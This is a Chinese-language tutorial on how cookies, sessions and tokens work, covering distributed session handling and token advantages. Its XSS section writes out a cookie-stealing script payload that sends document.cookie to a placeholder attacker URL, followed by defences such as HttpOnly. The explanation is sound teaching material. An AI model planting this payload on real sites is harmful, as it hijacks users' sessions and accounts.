# Cookie，Session，Token的区别和联系

[toc]

## 	Cookie

Cookie指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。Cookie总是保存在客户端中，按在客户端中的存储位置，可分为内存Cookie和硬盘Cookie。内存Cookie由浏览器维护，保存在内存中，浏览器关闭后就消失了，其存在时间是短暂的。硬盘Cookie保存在硬盘里，有一个过期时间，除非用户手工清理或到了过期时间，硬盘Cookie不会被删除，其存在时间是长期的。所以，按存在时间，可分为非持久Cookie和持久Cookie。

### Cookie的用途

#### 1) Session管理

一般来说Cookie配合session使用。服务器对于客户端的访问，为了保存状态，会生成一个JessionId。一般这个jessionid是会被保存到浏览器的，之后每次访问服务器，都会带上这个jessionid标识。
cookie是不能够跨域使用的。

#### 2) 个性化

Cookie可以被用于记录一些信息，以便于在后续用户浏览页面时展示相关内容。典型的例子是购物站点的购物车功能。

另一个个性化应用是广告定制。你访问过的网站会写入一些Cookies在你的浏览器里，这些Cookies会被一些广告公司用来售卖更精准的广告。

#### 3) User Tracking

Cookie也可以用于追踪用户行为，例如是否访问过本站点，有过哪些操作等。

### XSS攻击

一般来说，如果用户B能够获得用户A在xxx网站上的cookie，那么就能够冒充A用户进行操作。XSS(跨网站脚本)就可以做到这一点。

比如说一个网站没有任何的防范的措施，我们可以在他的留言板（用户都可以访问到的地方）上插入一段js代码用于获得他的cookie信息，并且发送到一个我们的服务器上

<script>
    document.location = 'http://你的网址/cookie.php?cookie=' + document.cookie;
</script>

这样子，每一个点击对应链接的人，他的cookie信息都会被我们劫持，之后我们可以通过cookie进行操控。

**当然，对于这个方法，也有简单的应对方法**。

1. **给Cookie添加HttpOnly属性**, 这种属性设置后, 只能在http请求中传递, 在脚本中,**document.cookie**无法获取到该Cookie值. 对XSS的攻击, 有一定的防御值. 但是对网络拦截, 还是泄露了.

2. **在cookie中添加校验信息, 这个校验信息和当前用户外置环境有些关系,比如ip,user agent等有关.**这样当cookie被人劫持了, 并冒用, 但是在服务器端校验的时候, 发现校验值发生了变化, 因此要求重新登录, 这样也是种很好的思路, 去规避cookie劫持.

3. **cookie中session id的定时更换, 让session id按一定频率变换**, 同时对用户而言, 该操作是透明的, 这样保证了服务体验的一致性.

## Session

session记录服务器和客户端会话状态的机制。session在服务端生成和保存，并转化为一个临时的Cookie（sessionId）发送给客户端，当客户端第一次请求服务器时，会检查是否携带了这个Session，如果没有则会添加Session。

### session和cookie的区别

- **安全性：** Session 比 Cookie 安全，Session 是存储在服务器端的，Cookie 是存储在客户端的。
- **存取值的类型不同**：Cookie 只支持存字符串数据，想要设置其他类型的数据，需要将其转换成字符串，Session 可以存任意数据类型。
- **有效期不同：** Cookie 可设置为长时间保持，比如我们经常使用的默认登录功能，Session 一般失效时间较短，客户端关闭（默认情况下）或者 Session 超时都会失效。
- **存储大小不同：** 单个 Cookie 保存的数据不能超过 4K，Session 可存储数据远高于 Cookie，但是当访问量过多，会占用过多的服务器资源。

### 分布式session

当我们的项目越来越大，用户也越来越多的时候，当一台服务器已经不能够满足现有用户规模的时候，session也就暴露出了他的问题所在。

假设第一次访问服务A生成一个sessionid并且存入cookie中，第二次却访问服务B客户端会在cookie中读取sessionid加入到请求头中，如果在服务B通过sessionid没有找到对应的数据那么它创建一个新的并且将sessionid返回给客户端,这样并不能共享我们的Session无法达到我们想要的目的。

#### 解决方案

#### 1）Session复制

在支持Session复制的Web服务器上，通过修改Web服务器的配置，可以实现将Session同步到其它Web服务器上，达到每个Web服务器上都保存一致的Session。

#### 2）Session粘滞

将用户的每次请求都通过某种方法强制分发到某一个Web服务器上，只要这个Web服务器上存储了对应Session数据，就可以实现会话跟踪。

#### 3）Session集中管理(推荐)

在单独的服务器或服务器集群上使用缓存技术，如Redis存储Session数据，集中管理所有的Session，所有的Web服务器都从这个存储介质中存取对应的Session，实现Session共享。

#### 4）基于Cookie管理

这种方式每次发起请求的时候都需要将Session数据放到Cookie中传递给服务端。

## Token

token指访问资源的凭据，用于检验请求的合法性。

- 安全，token 可以避免 CSRF 攻击(因为不需要 cookie 了)。

- 服务端无状态化、可扩展性好
- 支持移动端设备
- 支持跨程序调用

### Token与Session的区别

- token和session最大的区别在于token不再在服务端保存过多的数据，只做数据的检验，用校验token的时间去换取存取session的空间。

- Session 是一种记录服务器和客户端会话状态的机制，使服务端有状态化，可以记录会话信息。而 Token 是令牌，访问资源接口（API）时所需要的资源凭证。Token 使服务端无状态化，不会存储会话信息。
- Session 和 Token 并不矛盾，作为身份认证 Token 安全性比 Session 好，因为每一个请求都有签名还能防止监听以及重放攻击，而 Session 就必须依赖链路层来保障通讯安全了。如果你需要实现有状态的会话，仍然可以增加 Session 来在服务器端保存一些状态。